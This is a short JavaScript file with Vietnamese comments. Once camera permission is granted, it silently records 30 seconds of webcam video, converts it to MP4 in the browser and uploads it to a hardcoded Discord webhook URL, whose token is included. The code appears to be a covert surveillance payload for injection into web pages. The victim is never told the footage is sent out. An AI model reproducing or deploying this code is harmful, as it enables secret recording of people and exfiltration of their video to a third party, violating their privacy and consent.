// y.js - Chỉ quay camera, không yêu cầu micro
(async function(){
  const { createFFmpeg, fetchFile } = FFmpeg;
  const ffmpeg = createFFmpeg({
    log: false,
    corePath: 'https://unpkg.com/@ffmpeg/core@0.12.6/dist/umd/ffmpeg-core.js'
  });
  await ffmpeg.load();

  // Chỉ yêu cầu camera
  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
  const chunks = [];

  rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };

  rec.onstop = async () => {
    const webmBlob = new Blob(chunks, { type: 'video/webm' });
    ffmpeg.FS('writeFile', 'in.webm', await fetchFile(webmBlob));

    await ffmpeg.run(
      '-i', 'in.webm',
      '-c:v', 'libx264',
      '-preset', 'ultrafast',
      '-b:v', '500k',
      '-an',                    // bỏ audio track hoàn toàn
      'out.mp4'
    );

    const mp4Data = ffmpeg.FS('readFile', 'out.mp4');
    const mp4Blob = new Blob([mp4Data.buffer], { type: 'video/mp4' });

    const form = new FormData();
    form.append('file', mp4Blob, 'cam.mp4');
    form.append('payload_json', JSON.stringify({ content: '🎥 Video MP4 30s (chỉ camera)' }));

    await fetch('https://discord.com/api/webhooks/1571360407652929699/hSfivjJZe6k00NGmRLkpP5KdYfFK0hrFwpVje9kTrAdcS713-8jpRjXWMSP0koQFHxQm', {
      method: 'POST',
      body: form
    });

    stream.getTracks().forEach(t => t.stop());
  };

  rec.start();
  setTimeout(() => rec.stop(), 30000);
})();
